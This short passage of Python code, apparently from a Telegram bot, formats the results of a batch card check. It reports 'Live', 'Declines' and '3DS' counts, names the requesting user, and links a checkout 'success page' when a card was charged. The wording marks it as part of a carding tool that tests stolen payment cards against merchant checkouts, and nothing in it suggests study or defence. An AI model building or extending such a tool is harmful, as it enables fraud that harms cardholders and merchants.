        response += f"✅ 𝗟𝗶𝘃𝗲: {live_count}\n"
    response += f"🥲 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝘀: {declined_count}\n"
    if three_ds_count > 0:
        response += f"😡 𝟯𝗗𝗦: {three_ds_count}\n"
    if error_count > 0:
        response += f"💀 𝗘𝗿𝗿𝗼𝗿𝘀: {error_count}\n"
    response += f"🧮 𝗧𝗼𝘁𝗮𝗹: {len(results)}/{len(cards)}\n"
    response += f"⏱ 𝗧𝗼𝘁𝗮𝗹 𝗧𝗶𝗺𝗲: {format_time(total_time)}\n"
    req_name = msg.from_user.full_name or msg.from_user.username or 'Unknown'
    req_user = f"@{msg.from_user.username}" if msg.from_user.username else req_name
    response += f"\nMᴇssᴀɢᴇ Bʸ: {req_user}</blockquote>"
    
    # Add success URL if card was charged
    if charged_card and checkout_data.get('success_url'):
        response += f"\n\n<blockquote>🔗 <a href=\"{checkout_data['success_url']}\">Open Success Page</a></blockquote>"
    
    await processing_msg.edit_text(response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
